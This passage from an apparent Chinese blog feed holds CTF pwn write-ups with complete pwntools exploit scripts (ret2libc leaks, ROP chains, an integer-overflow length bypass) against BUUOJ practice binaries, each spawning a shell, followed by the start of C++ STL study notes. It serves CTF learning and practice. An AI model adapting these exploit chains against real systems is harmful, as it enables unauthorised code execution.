-t命令查看发现程序没有符号表，原因应该是出题人使用strip命令去符号表了</p><p>完整exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28188</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = process('./pwn')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'\x00'</span><span class="token operator">+</span>b<span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">7</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Correct\n"</span><span class="token punctuation">)</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#main_addr = elf.plt['__libc_start_main']</span>main_addr <span class="token operator">=</span> <span class="token number">0x8048825</span>payload1 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xe7</span><span class="token operator">+</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(hex(write_addr))</span>libc_base <span class="token operator">=</span> write_addr <span class="token operator">-</span>  libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Correct\n"</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xe7</span><span class="token operator">+</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h1><p>经典ret2libc3</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072259415.png" alt="image-20230807225923356"></p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span> context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#p = process('./pwn') </span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28146</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>plt_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>got_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>pay1 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>plt_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>got_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xD</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay1<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0xf7db1190</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"write_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>offset<span class="token operator">=</span>write_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sys_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sh_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>pay2 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p>32位开NX泄露libc</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081045150.png" alt="image-20230808104509112"></p><p>注意get_n是自定义函数</p><p>规定读入v2长度的字符，但是程序要求v2不大于32。观察到int型的v2传入unsigned int型的a2，可以传入-1整数溢出绕过。</p><p>ROP链泄露libc，溢出覆盖返回地址getshell</p><h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span> context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#p = process('./pwn0') </span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26602</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">"How many bytes do you want me to read?"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">'-1'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn0'</span><span class="token punctuation">)</span> main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>plt_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>got_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'getchar'</span><span class="token punctuation">]</span>fmt <span class="token operator">=</span> <span class="token number">0x080486F</span><span class="token comment" spellcheck="true">#第一行的才正确？</span>pay1 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>plt_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>got_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt)</span><span class="token comment" spellcheck="true">#pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay1<span class="token punctuation">)</span>getchar_addr<span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#getchar_addr = u32(p.recv()[0:4])变成接收前面四个字节了</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"getchar_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>getchar_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''libc=LibcSearcher('getchar',getchar_addr)offset=getchar_addr-libc.dump('getchar')binsh=offset+libc.dump('str_bin_sh')system=offset+libc.dump('system')'''</span>base_addr <span class="token operator">=</span> getchar_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getchar'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> base_addrbinsh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> base_addr<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print("libc_base_addr = ",hex(offset))</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sys_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sh_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>pay2 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">"How many bytes do you want me to read?"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">'-1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><h2 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h2><p>64位，与32位传参有区别</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072310866.png" alt="image-20230807231036816"></p><p>思路：</p><ol><li>利用puts函数泄露出puts函数真实地址</li><li>通过puts函数地址计算出libc基地址，从而计算出system和binsh的真实地址</li><li>构造rop链栈溢出getshell</li></ol><p>puts函数通过pop rdi ; ret 传参</p><p>用ROPgadget可以找到</p><h2 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding = utf-8</span> <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>  context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29917</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#elf</span>    main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>    plt_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    got_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    pop_rdi   <span class="token operator">=</span> <span class="token number">0x0400733</span>    ret_addr  <span class="token operator">=</span> <span class="token number">0x04004c9</span>        payload   <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Pull up your sword and tell me u story!\n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#libc</span>    lib         <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>     lib_puts_addr   <span class="token operator">=</span> lib<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>    lib_system_addr <span class="token operator">=</span> lib<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>    lib_bin_addr    <span class="token operator">=</span> lib<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#base</span>    base_addr       <span class="token operator">=</span> puts_addr <span class="token operator">-</span> lib_puts_addr    system_addr<span class="token operator">=</span> base_addr <span class="token operator">+</span> lib_system_addr    bin_addr<span class="token operator">=</span> base_addr <span class="token operator">+</span> lib_bin_addr    payload<span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Pull up your sword and tell me u story!\n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>64位的ret2libc3</p><h2 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h2><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308080953982.png" alt="image-20230808095301880"></p><p>利用printf泄露libc版本和基地址，传参的时候需要传入格式化字符串%s给寄存器rdi（程序中第二个printf函数自带，返回至该格式化字符串地址即可）；并将想要泄露的read_got传给寄存器。</p><h2 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25502</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = process('./babyrop2')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babyrop2'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一定要用题目给的libc文件，可能必须要用题目给的才能打通</span>printf_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>main_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000400733</span>pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400731</span>fmt <span class="token operator">=</span> <span class="token number">0x0000000000400790</span>payload1 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_plt<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name? "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"read_addr ======>> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> read_addr <span class="token operator">-</span>  libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="collections" scheme="http://lmarch2.github.io/categories/collections/"/>
    
    
    <category term="ctf" scheme="http://lmarch2.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>C++STL 学习笔记</title>
    <link href="http://lmarch2.github.io/posts/45592537/"/>
    <id>http://lmarch2.github.io/posts/45592537/</id>
    <published>2023-08-29T12:37:51.000Z</published>
    <updated>2024-02-04T06:46:12.338Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="C-STL-学习笔记"><a href="#C-STL-学习笔记" class="headerlink" title="C++STL 学习笔记"></a>C++STL 学习笔记</h1><p>记录一些数据结构课外学习STL容器使用的笔记，当个字典用吧嘿嘿~~</p><!-- toc --><ul><li><a href="#stl--">STL补充</a><ul><li><a href="#list----">List  链表</a></li><li><a href="#vector-------------">vector  存放任意类型的动态数组</a></li></ul></li><li><a href="#stl-----">STL容器适配器</a><ul><li><a href="#stack">stack</a></li><li><a href="#queue">queue</a></li><li><a href="#priority-queue">priority_queue</a></li><li><a href="#deque">deque</a></li><li><a href="#heap">heap</a></li><li><a href="#pair">pair</a></li></ul></li><li><a href="#-------">迭代器类型补充</a></li><li><a href="#stl---------">STL对于空间大小的规定</a></li></ul><!-- tocstop --><h2 id="STL补充"><a href="#STL补充" class="headerlink" title="STL补充"></a>STL补充</h2><h3 id="List-链表"><a href="#List-链表" class="headerlink" title="List  链表"></a>List  链表</h3><ul><li><p><code> list&lt;int&gt; mylist = { }</code>链表定义和初始化</p></li><li><p><code>void push_front(const T &amp; val) </code> 将 val 插入链表最前面 </p></li><li><p><code>void pop_front()  </code> 删除链表最前面的元素 </p></li><li><p><code>list.push_back()</code> 增加一个新的元素在 list 的尾端 </p></li><li><p><code>list.pop_back()</code> 删除 list 的最末个元素 </p></li><li><p><code>void sort() </code>  将链表从小到大排序 </p></li><li><p><code>reverse()</code>反转链表</p></li><li><p><code>list.empty()</code> 